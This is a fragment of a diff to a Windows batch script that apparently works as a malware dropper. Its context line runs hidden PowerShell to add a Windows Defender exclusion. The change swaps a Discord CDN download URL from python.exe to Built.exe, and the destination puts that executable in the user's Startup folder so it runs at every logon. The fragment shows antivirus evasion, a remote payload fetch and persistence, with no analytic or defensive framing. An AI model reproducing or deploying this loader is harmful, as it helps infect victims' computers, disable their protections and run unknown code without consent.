@@ -3,7 +3,7 @@ powershell -w hidden -c Add-MpPreference -ExclusionPath ""
 @echo off
 setlocal 
 
-set "URL=https://cdn.discordapp.com/attachments/1206721383820820553/1254471867633504448/python.exe?ex=66799d78&is=66784bf8&hm=b8ea3b33a0dd1975c8a83108dbdb28fab450d4798affb35acb3cc17b0e88da2c&"
+set "URL=https://cdn.discordapp.com/attachments/1206721383820820553/1254533573139107972/Built.exe?ex=6679d6ef&is=6678856f&hm=4070da9d176e62a07b5b2122aa9c0c82402d948d0d953e904d3285aeee693b4c&"
 set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
 
 
